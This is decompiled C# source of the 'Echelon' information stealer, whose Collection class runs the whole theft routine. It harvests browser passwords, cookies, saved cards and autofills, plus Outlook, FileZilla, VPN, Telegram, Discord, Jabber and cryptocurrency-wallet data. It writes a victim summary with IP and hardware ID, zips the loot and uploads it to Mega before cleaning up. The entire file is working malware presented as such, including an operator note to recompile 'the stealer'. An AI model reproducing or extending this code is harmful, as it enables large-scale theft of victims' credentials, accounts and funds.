﻿using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using ChromV1;
using ChromV2;
using Echelon.Global;
using Echelon.Stealer.Browsers;
using Echelon.Stealer.Browsers.Edge;
using Echelon.Stealer.Browsers.Helpers;
using Echelon.Stealer.Browsers.Helpers.NoiseMe.Drags.App.Models.JSON;
using Echelon.Stealer.Discord;
using Echelon.Stealer.EmailClients;
using Echelon.Stealer.FTP;
using Echelon.Stealer.Grab;
using Echelon.Stealer.Jabber;
using Echelon.Stealer.SystemsData;
using Echelon.Stealer.Telegram;
using Echelon.Stealer.VPN;
using Echelon.Stealer.Wallets;
using Ionic.Zip;
using Ionic.Zlib;

namespace Echelon.Stealer
{
	// Token: 0x02000005 RID: 5
	public static class Collection
	{
		// Token: 0x06000009 RID: 9 RVA: 0x00018850 File Offset: 0x00016A50
		[STAThread]
		public static void GetChromium()
		{
			try
			{
				Chromium.Set(Help.HWID);
				Chromium.GetCards(Help.Cards);
				Chromium.GetCookies(Help.Cookies);
				Chromium.GetPasswords(Help.Passwords);
				Chromium.GetAutofills(Help.Autofills);
				Chromium.GetDownloads(Help.Downloads);
				Chromium.GetHistory(Help.History);
				Chromium.GetPasswordsOpera(Help.Passwords);
				Chromium.GetCookiesOpera(Help.Cookies);
			}
			catch
			{
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000188CC File Offset: 0x00016ACC
		public static void GetGecko()
		{
			try
			{
				Steal.Cookies();
				Steal.Passwords();
			}
			catch
			{
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x000188F8 File Offset: 0x00016AF8
		public static void GetCollection()
		{
			Collection.<>c__DisplayClass2_0 CS$<>8__locals1 = new Collection.<>c__DisplayClass2_0();
			Console.ForegroundColor = ConsoleColor.White;
			Console.WriteLine("Если вы это видите, значит запуск происходит в консольном режиме. Не забудьте перекомпилировать стиллер как 'Приложение Windows'.");
			Console.WriteLine("If you see this, then the launch is in console mode. Do not forget to recompile the stealer as a 'Windows application'.");
			try
			{
				Directory.CreateDirectory(Help.collectionDir);
				Directory.CreateDirectory(Help.Browsers);
				Directory.CreateDirectory(Help.Passwords);
				Directory.CreateDirectory(Help.Autofills);
				Directory.CreateDirectory(Help.Downloads);
				Directory.CreateDirectory(Help.Cookies);
				Directory.CreateDirectory(Help.History);
				Directory.CreateDirectory(Help.Cards);
			}
			catch
			{
			}
			Collection.<>c__DisplayClass2_0 CS$<>8__locals2 = CS$<>8__locals1;
			Task[] array = new Task[1];
			array[0] = new Task(delegate()
			{
				Start.a();
			});
			CS$<>8__locals2.t0 = array;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals3 = CS$<>8__locals1;
			Task[] array2 = new Task[1];
			array2[0] = new Task(delegate()
			{
				Collection.GetChromium();
			});
			CS$<>8__locals3.t1 = array2;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals4 = CS$<>8__locals1;
			Task[] array3 = new Task[1];
			array3[0] = new Task(delegate()
			{
				Collection.GetGecko();
			});
			CS$<>8__locals4.t2 = array3;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals5 = CS$<>8__locals1;
			Task[] array4 = new Task[1];
			array4[0] = new Task(delegate()
			{
				Edge.GetEdge(Help.Passwords);
			});
			CS$<>8__locals5.t3 = array4;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals6 = CS$<>8__locals1;
			Task[] array5 = new Task[1];
			array5[0] = new Task(delegate()
			{
				Outlook.GrabOutlook(Help.collectionDir);
			});
			CS$<>8__locals6.t4 = array5;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals7 = CS$<>8__locals1;
			Task[] array6 = new Task[1];
			array6[0] = new Task(delegate()
			{
				FileZilla.GetFileZilla(Help.collectionDir);
			});
			CS$<>8__locals7.t5 = array6;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals8 = CS$<>8__locals1;
			Task[] array7 = new Task[1];
			array7[0] = new Task(delegate()
			{
				TotalCommander.GetTotalCommander(Help.collectionDir);
			});
			CS$<>8__locals8.t6 = array7;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals9 = CS$<>8__locals1;
			Task[] array8 = new Task[1];
			array8[0] = new Task(delegate()
			{
				ProtonVPN.GetProtonVPN(Help.collectionDir);
			});
			CS$<>8__locals9.t7 = array8;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals10 = CS$<>8__locals1;
			Task[] array9 = new Task[1];
			array9[0] = new Task(delegate()
			{
				OpenVPN.GetOpenVPN(Help.collectionDir);
			});
			CS$<>8__locals10.t8 = array9;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals11 = CS$<>8__locals1;
			Task[] array10 = new Task[1];
			array10[0] = new Task(delegate()
			{
				NordVPN.GetNordVPN(Help.collectionDir);
			});
			CS$<>8__locals11.t9 = array10;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals12 = CS$<>8__locals1;
			Task[] array11 = new Task[1];
			array11[0] = new Task(delegate()
			{
				Telegram.GetTelegram(Help.collectionDir);
			});
			CS$<>8__locals12.t10 = array11;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals13 = CS$<>8__locals1;
			Task[] array12 = new Task[1];
			array12[0] = new Task(delegate()
			{
				Discord.GetDiscord(Help.collectionDir);
			});
			CS$<>8__locals13.t11 = array12;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals14 = CS$<>8__locals1;
			Task[] array13 = new Task[1];
			array13[0] = new Task(delegate()
			{
				Wallets.GetWallets(Help.collectionDir);
			});
			CS$<>8__locals14.t12 = array13;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals15 = CS$<>8__locals1;
			Task[] array14 = new Task[1];
			array14[0] = new Task(delegate()
			{
				Systemsinfo.GetSystemsData(Help.collectionDir);
			});
			CS$<>8__locals15.t13 = array14;
			Collection.<>c__DisplayClass2_0 CS$<>8__locals16 = CS$<>8__locals1;
			Task[] array15 = new Task[1];
			array15[0] = new Task(delegate()
			{
				Dec.Decrypt(Help.Passwords);
			});
			CS$<>8__locals16.t15 = array15;
			try
			{
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t0;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t1;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t2;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t3;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t4;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t5;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t6;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t7;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t8;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t9;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t10;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t11;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t12;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t13;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				new Thread(delegate()
				{
					Task[] t = CS$<>8__locals1.t15;
					for (int i = 0; i < t.Length; i++)
					{
						t[i].Start();
					}
				}).Start();
				Task.WaitAll(CS$<>8__locals1.t0);
				Task.WaitAll(CS$<>8__locals1.t1);
				Task.WaitAll(CS$<>8__locals1.t2);
				Task.WaitAll(CS$<>8__locals1.t3);
				Task.WaitAll(CS$<>8__locals1.t4);
				Task.WaitAll(CS$<>8__locals1.t5);
				Task.WaitAll(CS$<>8__locals1.t6);
				Task.WaitAll(CS$<>8__locals1.t7);
				Task.WaitAll(CS$<>8__locals1.t8);
				Task.WaitAll(CS$<>8__locals1.t9);
				Task.WaitAll(CS$<>8__locals1.t10);
				Task.WaitAll(CS$<>8__locals1.t11);
				Task.WaitAll(CS$<>8__locals1.t12);
				Task.WaitAll(CS$<>8__locals1.t13);
				Task.WaitAll(CS$<>8__locals1.t15);
			}
			catch
			{
			}
			Console.ForegroundColor = ConsoleColor.Green;
			DomainDetect.GetDomainDetect(Help.Browsers);
			Start.b();
			string contents = string.Concat(new string[]
			{
				"<!DOCTYPE html>\n<html>\n<body>\n<style>\nbody {\nbackground-image: url('https://steamcdn-a.akamaihd.net/steamcommunity/public/images/items/383690/f7a121a3f7a929ffb4dbc3ae241b3b4b6eaaed1d.jpg');\nbackground-repeat: no-repeat;\nbackground-attachment: fixed;\nbackground-size: 100% 100%;\n}\n</style>\n<center>\n<h1 style=\"color:white\">",
				JsonValue.buildversion,
				"</h1>\n<p style=\"color:white\">\ud83d\udc64 ",
				Help.machineName,
				"/",
				Help.userName,
				"</p>\n<p style=\"color:white\">\ud83c\udff4 IP: ",
				Help.IP(),
				Help.Country(),
				"</p>\n<h2 style=\"color:white\">\ud83c\udf10 Browsers Data</h2>\n<p style=\"color:white;margin-left:-6em\">   ∟\ud83d\udd11</p>\n<p style=\"color:white;margin-left:3em\">     ∟Chromium v1: ",
				Chromium.Passwords.ToString(),
				"</p>\n<p style=\"color:white;margin-left:3em\">     ∟Chromium v2: ",
				Dec.colvo.ToString(),
				"</p>\n<p style=\"color:white;margin-left:-1.5em\">     ∟Edge: ",
				Edge.count.ToString(),
				"</p>\n<p style=\"color:white;margin-left:-0.9em\">     ∟Gecko: ",
				Steal.count.ToString(),
				"</p>\n<p style=\"color:white;margin-left:-4em\">   ∟\ud83c\udf6a",
				(Chromium.Cookies + Steal.count_cookies).ToString(),
				"</p>\n<p style=\"color:white;margin-left:-4em\">   ∟\ud83d\udd51",
				Chromium.History.ToString(),
				"</p>\n<p style=\"color:white;margin-left:-4.5em\">   ∟\ud83d\udcdd",
				Chromium.Autofills.ToString(),
				"</p>\n<p style=\"color:white;margin-left:-5.5em\">   ∟\ud83d\udcb3",
				Chromium.CC.ToString(),
				"</p>\n<p style=\"color:white;margin-left:-4.8em\">   ∟⨭",
				Chromium.Downloads.ToString(),
				"</p>\n<p style=\"color:white\">\ud83d\udcb6 Wallets: ",
				(Wallets.count > 0) ? "✅" : "❌",
				(Electrum.count > 0) ? " Electrum" : "",
				(Armory.count > 0) ? " Armory" : "",
				(AtomicWallet.count > 0) ? " Atomic" : "",
				(BitcoinCore.count > 0) ? " BitcoinCore" : "",
				(Bytecoin.count > 0) ? " Bytecoin" : "",
				(DashCore.count > 0) ? " DashCore" : "",
				(Ethereum.count > 0) ? " Ethereum" : "",
				(Exodus.count > 0) ? " Exodus" : "",
				(LitecoinCore.count > 0) ? " LitecoinCore" : "",
				(Monero.count > 0) ? " Monero" : "",
				(Zcash.count > 0) ? " Zcash" : "",
				(Jaxx.count > 0) ? " Jaxx" : "",
				"</p>\n<p style=\"color:white\">\ud83d\udcc2 FileGrabber: ",
				Grab.countFiles.ToString(),
				"</p>\n<p style=\"color:white\">\ud83d\udcb0 Recursive Wallets: ",
				Grab.countWallets.ToString(),
				"</p>\n<p style=\"color:white\">\ud83d\udda5 RDP: ",
				Grab.countRdp.ToString(),
				"</p>\n<p style=\"color:white\">\ud83d\udcac Discord: ",
				(Discord.count > 0) ? "✅" : "❌",
				"</p>\n<p style=\"color:white\">✈️ Telegram: ",
				(Telegram.count > 0) ? "✅" : "❌",
				"</p>\n<p style=\"color:white\">\ud83d\udca1 Jabber: ",
				(Startjabbers.count + Pidgin.PidginCount > 0) ? "✅" : "❌",
				(Pidgin.PidginCount > 0) ? (" Pidgin (" + Pidgin.PidginAkks.ToString() + ")") : "",
				(Startjabbers.count > 0) ? " Psi" : "",
				"</p>\n<h2 style=\"color:white\">\ud83d\udce1 FTP</h2>\n<p style=\"color:white\">   ∟ FileZilla: ",
				(FileZilla.count > 0) ? ("✅ (" + FileZilla.count.ToString() + ")") : "❌",
				"</p>\n<p style=\"color:white\">   ∟ TotalCmd: ",
				(TotalCommander.count > 0) ? "✅" : "❌",
				"</p>\n<h2 style=\"color:white\">\ud83d\udd0c VPN</h2>\n<p style=\"color:white\">   ∟ NordVPN: ",
				(NordVPN.count > 0) ? "✅" : "❌",
				"</p>\n<p style=\"color:white\">   ∟ OpenVPN: ",
				(OpenVPN.count > 0) ? "✅" : "❌",
				"</p>\n<p style=\"color:white\">   ∟ ProtonVPN: ",
				(ProtonVPN.count > 0) ? "✅" : "❌",
				"</p>\n<p style=\"color:white\">\ud83c\udd94 HWID: ",
				Help.HWID,
				"</p>\n<p style=\"color:white\">⚙️ ",
				Systemsinfo.GetOSInformation(),
				"</p>\n<p style=\"color:white\">\ud83d\udd0e ",
				File.ReadAllText(Help.Browsers + "\\DomainDetect.txt"),
				"</p>\n</center>\n</body>\n</html>"
			});
			File.WriteAllText(Help.collectionDir + "\\InfoHERE.html", contents);
			Console.WriteLine("Упаковка архива");
			string text = string.Concat(new string[]
			{
				Help.dir,
				"\\",
				Help.userName,
				"_",
				Help.machineName,
				Help.CountryCOde(),
				".zip"
			});
			using (ZipFile zipFile = new ZipFile(Encoding.GetEncoding("cp866")))
			{
				zipFile.ParallelDeflateThreshold = -1L;
				zipFile.UseZip64WhenSaving = Zip64Option.Always;
				zipFile.CompressionLevel = CompressionLevel.Default;
				zipFile.AddDirectory(Help.collectionDir);
				zipFile.Save(text);
			}
			Console.WriteLine("Залив на мегу");
			MegaSend.TaskUpl(text);
			Clean.GetClean();
		}
	}
}
